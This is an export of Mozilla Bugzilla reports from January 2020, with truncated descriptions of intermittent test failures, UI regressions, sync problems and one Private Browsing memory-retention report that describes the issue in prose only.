1607199,Intermittent browser/base/content/test/tabcrashed/browser_shown.js | application terminated with exit code 1,RESOLVED,P5,INCOMPLETE,"**Filed by:** aciure [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283599609&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Nvad47bCQSWHOMgJnaQcKQ/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-06T12:17:38.912Z] 12:17:38 INFO - Buffered messages finished [task 2020-01-06T12:17:38.912Z] 12:17:38 ERROR - TEST-UNEXPECTED-FAIL | browser/base/content/test/tabcrashed/browser_shown.js | application terminated with exit code 1 [task 2020-01-06T12:17:38.913Z] 12:17:38 INFO - runtests.py | Application ran for: 0:00:19.984000 [task 2020-01-06T12:17:38.913Z] 12:17:38 INFO - zombiecheck | Reading PID log: c:\users\task_1578310858\appdata\local\temp\tmpxt65pwpidlog [task 2020-01-06T12:17:38.913Z] 12:17:38 INFO - ==> process 6036 launched child process 5980 (""Z:\task_1578310858\build\application\firefox\firefox.exe"" -contentproc --channel=""6036.0.1358741199\287180307"" -childID 1 -isForBrowser -prefsHandle 2164 -prefMapHandle 2156 -prefsLen 1 -prefMapSize 226502 -parentBuildID 20200106093103 -greomni ""Z:\task_1578310858\build\application\firefox\omni.ja"" -appomni ""Z:\task_1578310858\build\applicatio"
1607228,search suggestions on google.com not displayed,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Steps to reproduce: open google.com type into search box. Using nightly. Actual results: google suggestions are not displayed correctly. Expected results: List of google search suggestions should be displayed.
1607236,"Intermittent browser/components/customizableui/test/browser_934951_zoom_in_toolbar.js (finished) | application crashed [@ CA::AttrList::get(unsigned int, _CAValueType, void*) const + 0xf]",RESOLVED,--,DUPLICATE,"**Filed by:** apavel [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283626001&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/M7extdMgQ9en-tB-D52Npg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-06T15:10:25.040Z] 15:10:25 INFO - TEST-START | browser/components/customizableui/test/browser_934951_zoom_in_toolbar.js [task 2020-01-06T15:10:25.593Z] 15:10:25 INFO - GECKO(1920) | MEMORY STAT | vsize 7790MB | residentFast 490MB | heapAllocated 223MB [task 2020-01-06T15:10:25.594Z] 15:10:25 INFO - TEST-OK | browser/components/customizableui/test/browser_934951_zoom_in_toolbar.js | took 536ms [task 2020-01-06T15:10:37.086Z] 15:10:37 INFO - PROCESS-CRASH | browser/components/customizableui/test/browser_934951_zoom_in_toolbar.js (finished) | application crashed [@ CA::AttrList::get(unsigned int, _CAValueType, void*) const + 0xf] [task 2020-01-06T15:10:37.086Z] 15:10:37 INFO - Crash dump filename: /var/folders/f2/96b73tzd1jbflps__k3_x8dh000017/T/tmp4eaQb6.mozrunner/minidumps/A1CB18D6-A917-4E6F-896C-57B5730F34E2.dmp [task 2020-01-06T15:10:37.086Z] 15:10:37 INFO - Operating system: Mac OS X [task 2"
1607251,Do not implement WebGPU spec.,RESOLVED,--,INVALID,"WebGPU spec has issues mentioned in https://github.com/gpuweb/gpuweb/issues/534 . Despite that one of the spec repo maintainers behaves like they are by design. It may make sense not to implement the spec at all. If Google prefers to implement it, it should be a problem of users of their browser only."
1607288,Syncing storage-sync-crypto: request failed: Error: HTTP 507 Insufficient Storage,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Synced Firefox. Get the error msg in my sync logs. It looks like it's trying to sync storage for extensions I no longer have. I have maybe 4 of these but the rest are not on any of my devices. I tried removing all of my sync'd devices and syncing again but it's not fixing anything. Please secure file if it contains sensitive info. I think it's just a log file of hashes of extensions, though. Actual results: I get this error message when syncing Expected results: Sync succeeds with no errors"
1607295,Firefox lags whole computer,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Open any tab. Wait and browse the site until the Browser lags out the whole computer. Actual results: It stops any sounds from playing and all YouTube videos begin to load Expected results: The software should not stop all processes on my computer
1607296,Private Browsing Window data kept in parent process memory after closing,RESOLVED,--,DUPLICATE,"Based on the significance of Private browsing stated as (1) ""Private Browsing automatically erases your browsing information, such as passwords, cookies, and history, leaving no trace after you end the session."" within https://support.mozilla.org/en-US/kb/private-browsing-use-firefox-without-history & (2) ""Reality: Private Browsing works by removing cookies, browsing history, and passwords stored while you are browsing once you close your Private Window"" within https://support.mozilla.org/en-US/kb/common-myths-about-private-browsing - it was identified that even after closing all the active tabs/windows of Private browsing still passwords and other sensitive information could be retrieved from OS process memory. Description: While one opens private browsing and accesses any website, the parent process runs in background where the sensitive information is being saved. This leads to information leakage from process memory with privileged user even after all instances of Private browsing window is closed. Exploitability rational: Attacker needs to have alternate local privilege account within same system (e.g. corporate environment where Sys. admin/IT support team is victim and anothe"
1607312,Intermittent browser/components/customizableui/test/browser_934951_zoom_in_toolbar.js | Test timed out -,RESOLVED,P5,INCOMPLETE,**Filed by:** nerli [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283656837&repo=mozilla-esr68 **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/H3R53x2uT0mpGphCyVVpOw/runs/0/artifacts/public/logs/live_backing.log --- 17:20:52 INFO - TEST-START | browser/components/customizableui/test/browser_934951_zoom_in_toolbar.js 17:20:52 INFO - GECKO(1892) | 2020-01-06 17:20:52.956 firefox[1892:12662] Persistent UI failed to open file file:///Users/cltbld/Library/Saved%20Application%20State/org.mozilla.firefox.savedState/window_1.data: No such file or directory (2) 17:21:37 INFO - TEST-INFO | started process screencapture 17:21:37 INFO - TEST-INFO | screencapture: exit 0 17:21:37 INFO - Buffered messages logged at 17:20:52 17:21:37 INFO - Entering test bound 17:21:37 INFO - TEST-PASS | browser/components/customizableui/test/browser_934951_zoom_in_toolbar.js | Default zoom is 100% for about:mozilla - 17:21:37 INFO - TEST-PASS | browser/components/customizableui/test/browser_934951_zoom_in_toolbar.js | Zoom is changed to 110% for about:mozilla - 17:21:37 INFO - waiting for mutation of attribute 'label'. 17:21:37 INFO - TEST-PASS 
1607341,browser.bookmarks.onChanged event has datedAdded 1000x too high,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Bookmark a web page on Firefox mobile. Then wait (or force) synchronisation to desktop browser via Firefox Sync. Actual results: The ""dateAdded"" field in the event (supposed to be milliseconds since epoch) is 1000 times too high. Expected results: The ""dateAdded"" field should be in the correct number of milliseconds since epoch."
1607387,Session is not restored,RESOLVED,P3,WORKSFORME,"I'm consistently seeing a trivial (but annoying) issue on a mac machine: session doesn't get restored, FF always start with a new fresh session. That, despite the ""Resource previous session"" clearly enabled."
1607402,"Everything looks large, including image, tab width when ""Large Text"" is enabled from Linux OS preferences",RESOLVED,--,WONTFIX,"Linux MINT cinnamon 19. Reproducible: always Steps To Reproduce: 1. mint menu - Preferences - Accessibility - Visual turn on ""Large Text"" 2. Start Nightly Actual Results: Everything looks large, including image, tab width. Expected Results: Text only should be large."
1607410,Re-enable tracking protection messages,RESOLVED,P1,FIXED,Need to bring back the TP messages disabled by bug 1603483. The trigger rename bug 1604563 did not make it to 72 so the messages might only be re-enabled for 73+ depending on how the profiler data looks like for 72.
1607434,Intermittent [TV] browser/components/customizableui/test/browser_lwt_telemetry.js | Found an unexpected tab at the end of test run: about:blank -,RESOLVED,P5,INCOMPLETE,**Filed by:** cbrindusan [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283821637&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/ImBa1b7vSu65SKlYJD5NMA/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/ImBa1b7vSu65SKlYJD5NMA/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- [task 2020-01-07T12:37:22.509Z] 12:37:22 INFO - TEST-START | browser/components/customizableui/test/browser_lwt_telemetry.js [task 2020-01-07T12:37:22.589Z] 12:37:22 INFO - GECKO(4576) | [Parent 8308: Main Thread]: I/DocShellAndDOMWindowLeak ++DOCSHELL 00000228C2D7F800 == 7 [pid = 8308] [id = {4669ca30-762b-40c2-ab7b-60e1f8ca214e}] [task 2020-01-07T12:37:22.589Z] 12:37:22 INFO - GECKO(4576) | [Parent 8308: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 15 (00000228BDD6DC40) [pid = 8308] [serial = 15] [outer = 0000000000000000] [task 2020-01-07T12:37:22.594Z] 12:37:22 INFO - GECKO(4576) | [Parent 8308: Main Thread]: I/DocShellA
1607441,Pinned tabs order are reversed every time Nightly is restarted,VERIFIED,P1,FIXED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Build ID: 20200107095722 ### Steps to reproduce 1. In a new profile, pin 2 or more tabs, preferably with different favicons to differentiate them easier. 2. Restart, or close & reopen Nightly. ### Actual result Order for pinned tabs are reversed. ### Expected result Order remains unchanged. This is regressed by bug 1242912. Is bug 1606633 related?"
1607465,Pinned tabs are jumping out of their normal position while being dragged,VERIFIED,--,FIXED,"**Affected versions** * Firefox 72.0 (BuildId:20200103162918) * Firefox 73.0b1 (BuildId:20200106175743) * Firefox 74.0a1 (BuildId:20200107095722) **Affected platforms** * Windows 10 64bit. * Windows 10 32bit. * Windows 7 32bit. * Ubuntu 18.04 64bit. * macOS 10.11 **Steps to reproduce** 1. Launch Firefox. 2. Open around 20 tabs. 3. Pin several tabs. 4. Drag a pinned tab in order to change its position. **Expected result** * The pinned tab is successfully dragged and placed in a new position without any UI issues. **Actual result** * It seems that during the drag event the pinned tab shifts downwards (outside of its normal position), overlapping the beneath buttons. **Regression Range** * This seems to be a regression: * Pushlog: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=0b0779e6ebe39537f30b6bed33a0201f0434d308&tochange=e7c2e224629a2245860707cc92080b204014f61b * This issue seems to be caused by Bug 1576946 - Remove nsStackFrame platform code **Notes** * For further information regarding this issue please observe the attached screencast. * It seems that this issue is only reproducible if multiple tabs are opened ( until the tab navigation buttons ( ""<"" and "">"""
1607475,Search engines don't respect top sites ordering,RESOLVED,--,DUPLICATE,"STR: 1. On the new tab, click the meatball menu above the top sites section and add a search engine to your top sites. 2. Move that search engine to spot #2 - #8 in the top row. 3. Navigate to any website and click into the address bar and you will see the search engine you added to top sites in the #1 position instead of the position you placed it in. Expected result: The list of top sites in the address bar dropdown should match the content and order of the first row of top sites on the new tab/home page."
1607488,Perma browser/base/content/test/siteProtections/browser_protections_UI.js | Uncaught exception - when Gecko version increases to 75 on 2020-02-10,VERIFIED,P1,FIXED,"[Tracking Requested - why for this release]: Central as Version Increase simulation: https://treeherder.mozilla.org/#/jobs?repo=try&resultStatus=testfailed%2Cbusted%2Cexception&classifiedState=unclassified&revision=91a10ab055d0141772ad67db49d218c853ab1a33&selectedJob=283830382 Failure log: https://treeherder.mozilla.org/logviewer.html#/jobs?job_id=283830382&repo=try [task 2020-01-07T13:14:41.750Z] 13:14:41 INFO - TEST-START | browser/base/content/test/siteProtections/browser_protections_UI.js [task 2020-01-07T13:14:42.500Z] 13:14:42 INFO - TEST-INFO | started process screentopng [task 2020-01-07T13:14:42.953Z] 13:14:42 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-07T13:14:42.954Z] 13:14:42 INFO - Buffered messages logged at 13:14:41 [task 2020-01-07T13:14:42.954Z] 13:14:42 INFO - Entering test bound setup [task 2020-01-07T13:14:42.954Z] 13:14:42 INFO - Leaving test bound setup [task 2020-01-07T13:14:42.954Z] 13:14:42 INFO - Entering test bound testToggleSwitch [task 2020-01-07T13:14:42.954Z] 13:14:42 INFO - Buffered messages logged at 13:14:42 [task 2020-01-07T13:14:42.954Z] 13:14:42 INFO - Console message: [JavaScript Warning: ""The resource at “http://trackertest.org/” was"
1607499,"Perma browser/base/content/test/trackingUI/browser_trackingUI_telemetry.js | no CB exceptions at startup - Got undefined, expected 0 when Gecko version increases to 75 on 2020-02-10",VERIFIED,P1,FIXED,[Tracking Requested - why for this release]: Central as Version Increase simulation: https://treeherder.mozilla.org/#/jobs?repo=try&resultStatus=testfailed%2Cbusted%2Cexception&revision=91a10ab055d0141772ad67db49d218c853ab1a33&selectedJob=283826836 Failure log: https://treeherder.mozilla.org/logviewer.html#/jobs?job_id=283826836&repo=try&lineNumber=7523 [task 2020-01-07T13:14:23.481Z] 13:14:23 INFO - GECKO(2149) | MEMORY STAT | vsize 3121MB | residentFast 505MB | heapAllocated 223MB [task 2020-01-07T13:14:23.482Z] 13:14:23 INFO - TEST-OK | browser/base/content/test/trackingUI/browser_trackingUI_state_reset.js | took 8065ms [task 2020-01-07T13:14:23.484Z] 13:14:23 INFO - GECKO(2149) | [Child 2310: Main Thread]: I/DocShellAndDOMWindowLeak ++DOCSHELL 0x7f931c4bf800 == 3 [pid = 2310] [id = {c8b6df9f-2373-4fae-8481-c980c92903fa}] [task 2020-01-07T13:14:23.484Z] 13:14:23 INFO - GECKO(2149) | [Child 2310: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 20 (0x7f931ac5e980) [pid = 2310] [serial = 132] [outer = (nil)] [task 2020-01-07T13:14:23.485Z] 13:14:23 INFO - GECKO(2149) | [Child 2310: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 21 (0x7f931a016800) [pid = 2310] [ser
1607501,Perma browser/components/preferences/in-content/tests/browser_browser_languages_subdialog.js | The events are recorded correctly - when Gecko version increases to 75 on 2020-02-10,VERIFIED,P1,FIXED,"[Tracking Requested - why for this release]: Full test failure name: browser/components/preferences/in-content/tests/browser_browser_languages_subdialog.js | The events are recorded correctly - [] deepEqual [[""manage"",""main"",""33377""],[""search"",""dialog"",""33377""],[""add"",""dialog"",""33377"",{""installId"":6}],[""cancel"",""dialog"",""33377""]] - JS frame :: chrome://mochitests/content/browser/browser/components/preferences/in-content/tests/browser_browser_languages_subdialog.js :: assertTelemetryRecorde Central as Version Increase simulation: https://treeherder.mozilla.org/#/jobs?repo=try&resultStatus=testfailed%2Cbusted%2Cexception&revision=91a10ab055d0141772ad67db49d218c853ab1a33&selectedJob=283826807 Failure log: https://treeherder.mozilla.org/logviewer.html#/jobs?job_id=283826807&repo=try&lineNumber=2200 [task 2020-01-07T13:10:27.897Z] 13:10:27 INFO - gotoPref@chrome://browser/content/preferences/in-content/preferences.js:232:11 [task 2020-01-07T13:10:27.897Z] 13:10:27 INFO - init_all@chrome://browser/content/preferences/in-content/preferences.js:114:3 [task 2020-01-07T13:10:27.899Z] 13:10:27 INFO - EventListener.handleEvent*@chrome://browser/content/preferences/in-content/preferences.js:76:"
1607545,about_home_topsites_first_paint scalar is recorded on first about:home sighting even if it wasn't the first page loaded,VERIFIED,--,FIXED,"STR: 0. Ensure Firefox is configured to load about:home by default, and not to restore the previous session. 1. Launch Firefox Nightly via `./mach` with `./mach run https://www.mozilla.org`. 2. Once the initial tab finishes loading, open a new tab, and browse to `about:telemetry` 3. Choose ""Scalars"" along the left-hand side, and note that the `about_home_topsites_first_paint` scalar is (correctly) absent. 4. Open a new window. 5. Reload about:telemetry ER: The `about_home_topsites_first_paint` scalar should still be missing. AR: The `about_home_topsites_first_paint` was recorded. This might account for some of the truly egregious measurements we're getting on the `about_home_topsites_first_paint` probe, which is supposed to measure the time between process start and rendering the initial about:home."
1607554,Remove from Toolbar option is disabled for What's New button,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Updated Firefox to new version. ""What's New"" button is displayed next to menu button. In its context menu ""Remove from Toolbar"" option is disabled. Actual results: Impossible to remove this button from toolbar. Expected results: I don't care about What's New after updating, as I usually read change log before update. It would be great to have option to permanently hide ""What's New"" button from Toolbar. I'm not sure, but I think on previous version ""Remove from Toolbar"" option was not disabled, although button is still displayed, so it probably did not work. I know that it will disappear after clicking, but I would like to prevent it appearing after next update."
1607600,WebVR/WebXR turns Steamvr chaperone boundaries off for controllers,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open a webvr or webxr page in firefox. I have tested with different pages. I noticed the issue today after the ff (developer and public) update. Actual results: The Steamvr (v1.9.16) chaperone boundaries detection of the controllers turns off. No boundaries detection off the controllers for all, even you close firefox. You need restart Steamvr for the detection works again. Expected results: The Steamvr chaperone boundaries detection should work correctly."
1607616,"History and bookmarks not syncing, sent tabs never arrive, one synced device not visible",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Have four synced devices (Windows desktop, two Windows laptops and Android phone). Sending tabs between devices does not work, sent tabs never arrive. When sending tabs one of the devices (Android 9 Phone, Firefox 68.3.0) is not visible from other devices, but all devices are visible from the phone. History and bookmarks are not syncing. Tried signing out from Firefox account and singning back in on all devices, nothing changed. Attached the most recent error-sync log file from about:sync-log. Actual results: Sent tabs never arrive, history and bookmarks not syncing, one of the devices not visible Expected results: Sent tabs should arrive, history and bookmarks should sync, all connected devices should be visible."
1607617,Session Restore Buttons are Misaligned,RESOLVED,P2,DUPLICATE,"To reproduce, go to about:sessionrestore in trunk. The buttons for restore/start new are aligned to the far left, and vertically stacked. The issue is purely aesthetic."
1607630,pdf.js occasionally shows incorrect symbols until page is refreshed,RESOLVED,P1,FIXED,"I don't have easy steps to reliably reproduce this but I probably see it on average after about 2-3 hours of PDF reading. The issue is that some symbols (I believe it is ""some fonts"") display incorrectly in the document I'm reading. Reloading the page immediately fixes the symbols. I've attached a screen shot of a page, before and after reloading the page. Check, for example, the second line, where Prt(A) was incorrectly rendered as \eta\phi(A). Some potentially useful points (I haven't confirmed if they are important): 1. I am reading this document from a file on my hard drive, not the web. 2. The document in the images is freely available here [1]. 3. I am currently on the 01-05-20 nightly build on Windows. 4. I read a lot of PDFs. I'd say that this popped up, roughly, sometime in the last month. 5. I have gfx.canvas.remote set to true. I don't know if this still on in nightly by default or not. This is part of Bob Owen's project to move 2D canvas operations out of the content process. I set that to true many months ago but, again, just recently started seeing this. 6. Reloading the page seems to fix it every time. Other things, like changing tabs or switching window focus, seem "
1607644,"None of the links in the ""About Firefox"" window worked",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15 Steps to reproduce: Closed all windows/tabs. Selected About Firefox. Actual results: None of the links in the About Firefox window worked. Expected results: A new window should be opened."
1607676,Intermittent browser/components/sessionstore/test/browser_crashedTabs.js | Test timed out -,RESOLVED,P5,INCOMPLETE,"**Filed by:** ccoroiu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283976401&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/HdxEao4LSwe0ashT1yN-PA/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-08T07:17:54.880Z] 07:17:54 INFO - TEST-PASS | browser/components/sessionstore/test/browser_crashedTabs.js | Should be a remote browser - [task 2020-01-08T07:17:54.886Z] 07:17:54 INFO - Buffered messages logged at 07:16:24 [task 2020-01-08T07:17:54.886Z] 07:17:54 INFO - Longer timeout required, waiting longer... Remaining timeouts: 2 [task 2020-01-08T07:17:54.886Z] 07:17:54 INFO - Buffered messages logged at 07:17:09 [task 2020-01-08T07:17:54.886Z] 07:17:54 INFO - Longer timeout required, waiting longer... Remaining timeouts: 1 [task 2020-01-08T07:17:54.886Z] 07:17:54 INFO - Buffered messages finished [task 2020-01-08T07:17:54.886Z] 07:17:54 INFO - TEST-UNEXPECTED-FAIL | browser/components/sessionstore/test/browser_crashedTabs.js | Test timed out - [task 2020-01-08T07:17:54.886Z] 07:17:54 INFO - GECKO(5876) | MEMORY STAT | vsize 1193MB | vsizeMaxContiguous 190MB | residentFast 382MB | heapAllo"
1607677,Black square appears on first window Hamburger’s Menu when a drop down is presented on the second window,NEW,P3,,*Affected versions* * 74.0a1 (20200107215758) * 73.0b2 (20200107212705) * 72.0.1 (20200107212822) * 68.4.1esr (20200107212959) *Affected platforms* * Windows 10x64 * Ubuntu 18.04 * macOS 10.15 *Steps to reproduce* 1. Open Firefox and open a new window. 2. Go to about:addons and add a random extension from Recommended Extensions. 3. Observe the hamburger menu from the first window as long as the Manage your addons dropdown menu is active. *Expected result* * No visual glitches presented on the first Window. *Actual result* * Black (or white depending on the theme) square appears on the hamburger menu as long as a drop-down is active on the second one. *Regression Range* * Reproducible with Firefox 71.0a1 (20191009213914). I will search for one ASAP. *Notes* * Attached a screen recording with the issue. * The issue is reproducible on the first window as long as a dropdown from the hamburger menu is presented on the second one.
1607690,"TelemetrySend fails on doing pings, doPing ERROR eUnreachable",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: I didn't opt-out of sending technical and interaction data to Mozilla. After that using the browser normally, after some time checked the Browser Console and was greeted with many TelemetrySend errors. Actual results: Toolkit.Telemetry ERROR TelemetrySend::_doPing - error making request to https://incoming.telemetry.mozilla.org/submit/telemetry/b6ca…b8a95f0a14/update/Firefox/74.0a1/nightly/20200107215758?v=4: eUnreachable Toolkit.Telemetry ERROR TelemetrySend::sendPersistedPings - failed to send ping b6ca148b-2d76-4fe9-b799-edb8a95f0a14: {""isTrusted"":true} Expected results: Ping should be successful and telemetry should be sent."
1607714,Intermittent TV toolkit/components/normandy/test/browser/browser_RecipeRunner.js | getCapabilities should be called -,RESOLVED,P5,INCOMPLETE,"**Filed by:** ccoroiu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=283997233&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/FJ1PI2FAQyGJUjVa3tYDDg/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/FJ1PI2FAQyGJUjVa3tYDDg/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- task 2020-01-08T10:50:37.232Z] 10:50:37 INFO - TEST-PASS | toolkit/components/normandy/test/browser/browser_RecipeRunner.js | Filtered-out recipes should be reported - [[{""id"":""noMatch"",""action"":""noMatchAction"",""filter_expression"":""false""},""backoff""]] deepEqual [[{""id"":""noMatch"",""action"":""noMatchAction"",""filter_expression"":""false""},""backoff""]] - [task 2020-01-08T10:50:37.232Z] 10:50:37 INFO - Leaving test bound testRun [task 2020-01-08T10:50:37.233Z] 10:50:37 INFO - Entering test bound test_run_includesCapabilities [task 2020-01-08T10:50:37.233Z] 10:50:37 INFO - Buffered messages finished [task 2020-01-08T10:50:37.234Z] 10:50:37 INFO - TE"
1607724,License texts missing from about:license,VERIFIED,--,FIXED,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: The about:license page has a top link for ""Anti-Grain Geometry Public License"", but the link is dead and there is no license text for Anti-Grain Geometry. Also, the license page has the license information for lots of Rust crates, but it doesn't seem to have any license text about the Rust standard libraries. Actual results: License texts are missing from about:license. Expected results: The license texts should be visible on the about:license page."
1607732,about:certificate should be delisted from about:about and URL suggestions,RESOLVED,P5,WORKSFORME,As I recall in the past for about: pages which are useless when visited directly we've delisted them from about:about (and removed them from URL suggestions). One example being about:reader which is only useful when handed a URL. We should do this with about:certificate
1607780,wrong time zone with enterprise policy enabled,RESOLVED,--,DUPLICATE,"Steps to reproduce: Launch Firefox with and without a policies.json, check what Date() returns. Actual results: Without the enterprise policy I get the time in my system time zone. With the enterprise policy I get UTC. Expected results: Get the time in the system time zone whether a enterprise policy is enabled or not."
1607789,about:sessionrestore buttons misaligned,RESOLVED,--,INVALID,Screenshot attached. The Start New Session and Restore Session buttons are wrapped to a new line and don't seem to be aligned with each other or relative to the page.
1607797,Behaviour of multiple restricting providers is undefined,RESOLVED,P2,WONTFIX,"When Search Tips land, we'll have two restricting providers in conflict: Top Sites and Search Tips. We need to figure out how these two should interact, allowing them both to be shown at the appropriate times."
1607807,Text in settings buttons spills over,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Go to the the settings menu, then go to privacy and security and finally the Browserprivacy tab. Actual results: In the tab Browserprivacy of the Settings you can select Standard, Strict or adjusted. In these options there is also a button to refresh all tabs. The text in these buttons spills over. I am on the Dutch language settings. Expected results: The text should be contained in the button."
1607810,Drag & drop a link onto Bookmarks menu/Bookmarks widget broken after exiting DOM fullscreen,RESOLVED,P2,FIXED,User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Firefox 72.0 and 71 bookmarks save problem. Actual results: The full screen resets everything as in: https://bugzilla.mozilla.org/show_bug.cgi?id=1601706 As in this case. Expected results: Everything works when Firefox restarts. No error except scroll problems. Until we get into full screen. Everything is shown in the video. I tried on 2 computers.
1607812,"Nightly new tab takes a long time to load, then tries to download website",RESOLVED,--,INCOMPLETE,"Hello! I use Firefox Nightly on Mac OS (I see version 73.0a1 in about:support). Today I noticed a new problem: - Nightly is occasionally taking very long to load a website in a new tab. - It's not a network problem -- I switched WiFis to test, and other borwsers are able to load the same website acceptably fast. - Then sometimes after a while, I see a download prompt, like if Nightly is trying to download the website for some reason (Note: The URL I tried was https://github.com/gitpod-io/website, which is why the file is called ""website"".)"
1607822,Intermittent browser/extensions/doh-rollout/test/browser/browser_userInterference.js | Uncaught exception - undefined - timed out after 50 tries.,RESOLVED,P1,FIXED,**Filed by:** ccoroiu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284035075&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/H8DRXf4OT3OjQoGOVaz5Vg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-08T15:17:29.062Z] 15:17:29 INFO - TEST-START | browser/extensions/doh-rollout/test/browser/browser_userInterference.js [task 2020-01-08T15:17:34.189Z] 15:17:34 INFO - TEST-INFO | started process screentopng [task 2020-01-08T15:17:34.709Z] 15:17:34 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-08T15:17:34.710Z] 15:17:34 INFO - Buffered messages logged at 15:17:29 [task 2020-01-08T15:17:34.710Z] 15:17:34 INFO - Entering test bound testUserInterference [task 2020-01-08T15:17:34.710Z] 15:17:34 INFO - Buffered messages finished [task 2020-01-08T15:17:34.711Z] 15:17:34 INFO - TEST-UNEXPECTED-FAIL | browser/extensions/doh-rollout/test/browser/browser_userInterference.js | Uncaught exception - undefined - timed out after 50 tries. [task 2020-01-08T15:17:34.711Z] 15:17:34 INFO - Leaving test bound testUserInterference [task 2020-01-08T15:17:34.711Z] 15:17:34 INFO - GECKO(7084) | MEMORY STAT | v
1607868,pocket reader is re-enabled on the home screen after every update,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: After every update the pocket feature on the home screen is re-enabled. I've disabled it, and it should stay disabled."
1607879,"""What's New"" gift icon keeps reappearing even with browser.messaging-system.whatsNewPanel.enabled set to false",RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Actual results: While having browser.messaging-system.whatsNewPanel.enabled set to false and done the update from version 71 to version 72 the gift icon appeared after around 5-10 minutes on the right to the address bar. Resetting browser.messaging-system.whatsNewPanel.enabled in about:config and setting it back to false again caused the gift icon to immediately disappear but after a restart of Firefox and waiting for around 5-10 minutes again the gift icon just appeared again. Expected results: With browser.messaging-system.whatsNewPanel.enabled set to false the gift icon should never appear on the right to the address bar.
1607889,"Intermittent TV toolkit/components/normandy/test/browser/browser_RecipeRunner.js | only recipes with compatible capabilities should be executed - [] deepEqual [[{""name"":""match"",""filter_expression"":""true"",""capabilities"":[""compatible""]}]] - JS frame :: chro",RESOLVED,P5,INCOMPLETE,**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284052222&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Kt-WOaowRAqhWBHyJCAQvw/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Kt-WOaowRAqhWBHyJCAQvw/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 ---
